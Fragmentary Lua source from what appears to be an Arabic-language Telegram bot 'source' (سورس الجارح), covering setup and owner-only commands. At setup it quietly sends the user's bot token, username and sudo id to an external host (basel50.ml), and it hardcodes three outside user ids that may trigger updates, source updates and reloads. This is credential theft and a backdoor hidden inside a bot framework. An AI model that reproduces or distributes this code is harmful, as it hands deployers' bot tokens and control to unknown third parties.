...
https.request('https://basel50.ml/Gare77.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
Cr_file = io.open("./inc/Token.txt", "w")
Cr_file:write(Token)
Cr_file:close()
print('\27[1;36m￤Token.txt is created.\27[m')
local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس الجارح \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
...
if msg.sender_user_id_ == 656329268  or msg.sender_user_id_ == 953717439 or msg.sender_user_id_ == 1635597460 then 
...
if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 656329268 or msg.sender_user_id_ == 1635597460 or msg.sender_user_id_ == 953717439 ) then
return sendMsg(msg.chat_id_,msg.id_,"🗂¦ تم تحديث الملفات",function(arg,data)
Refresh_Start = true
end)
end 
if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 656329268 or msg.sender_user_id_ == 1635597460 or msg.sender_user_id_ == 953717439 ) then
UpdateSource(msg)
...
if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 656329268 or msg.sender_user_id_ == 1635597460 or msg.sender_user_id_ == 953717439 ) then
